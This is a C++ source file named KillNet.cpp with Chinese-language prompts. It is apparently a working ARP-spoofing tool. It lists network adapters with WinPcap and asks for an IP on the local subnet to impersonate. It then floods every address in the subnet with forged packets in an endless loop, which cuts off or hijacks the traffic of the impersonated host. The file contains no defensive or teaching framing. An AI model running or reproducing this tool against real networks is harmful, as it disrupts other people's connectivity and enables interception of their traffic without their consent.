// KillNet.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"


int _tmain(int argc, _TCHAR* argv[])
{
	pcap_if_t *alldevs,*d;
	pcap_addr_t *a;
	pcap_t *adhandle;
	u_int self_ip,dest_ip,fake_ip,netmask,net,netsize;
	struct in_addr self_ip_s,netmask_s,net_s;
	u_char *mac;
	char self_ip_end[20],netmask_end[20],net_end[20];
	u_char *packet;
	char *fakestr=new char[30];
	char errbuff[0xff];
	int i=0,num=0;
	int time=1;
	if(pcap_findalldevs_ex(PCAP_SRC_IF_STRING,NULL,&alldevs,errbuff)==-1)
		{
			fprintf(stderr,"获取设备列表错误:%s\n",errbuff);
			exit(1);
		}
	for(d=alldevs;d;d=d->next)
		{
			printf("%d. %s",++i,d->name);
			if(d->description)
				{
					printf("%s\n",d->description);
				}
			else
				{
					printf("无网络接口卡信息!\n");
				}
		}
	if(i==0)
		{
			printf("未找到网卡！\n");
			pcap_freealldevs(alldevs);
			exit(1);
		}
	printf("选择网卡:");
	scanf_s("%d",&num);
	for(i=0,d=alldevs;i<num-1;i++,d=d->next)
		{
			;
		}
	printf("你选择的网卡是:%s\n",d->description);
	for(a=d->addresses;a;a=a->next)
		{
			self_ip=((struct sockaddr_in *)a->addr)->sin_addr.S_un.S_addr;
			netmask=((struct sockaddr_in *)a->netmask)->sin_addr.S_un.S_addr;
			if(!self_ip || !netmask)
				{
					continue;
				}
		}
	mac=GetSelfMac(d->name+8);
	printf("\n主机网络信息:\nMAC:");
	net=self_ip & netmask;
	netsize=htonl(~netmask);
	for(int i=0;i<5;i++)
		{
			printf("%.2X-",mac[i]);
		}
	printf("%X",mac[5]);
	self_ip_s.s_addr=self_ip;
	strcpy_s(self_ip_end,inet_ntoa(self_ip_s));
	printf("\nIP地址:%s\n",self_ip_end);
	netmask_s.s_addr=netmask;
	strcpy_s(netmask_end,inet_ntoa(netmask_s));
	printf("子网掩码:%s\n",netmask_end);
	net_s.s_addr=net;
	strcpy_s(net_end,inet_ntoa(net_s));
	printf("网络地址:%s\n",net_end);
	printf("可伪装最大主机数:%d\n",netsize-2);
	if((adhandle=pcap_open(d->name,
		65535,
		PCAP_OPENFLAG_PROMISCUOUS,
		1000,
		NULL,
		errbuff))==NULL)
		{
			fprintf(stderr,"获取数据源错误:%s",errbuff);
		}
	pcap_freealldevs(alldevs);
	while(1)
		{
			printf("伪装IP地址:");
			cin>>fakestr;
			fake_ip=inet_addr(fakestr);
			if(fake_ip==INADDR_NONE)
				{
					printf("无效的IP地址!\n");
					continue;
				}
			if(net!=(fake_ip & netmask))
				{
					printf("只能伪装同一个网络的主机!\n");
					continue;
				}
			break;
		}
	while(1)
	{
	for(u_int i=0;i<netsize;i++)
		{
			dest_ip=net | htonl(i);
			packet=BuildPacket(mac,dest_ip,fake_ip);
			if(pcap_sendpacket(adhandle,packet,60)!=0)
				{
					printf("伪装失败\n");
					exit(1);
				}
			else
				{
					system("cls");
					cout<<"伪装成功！"<<"";
					Sleep(time);
				}
		}
	}
	return 0;
}

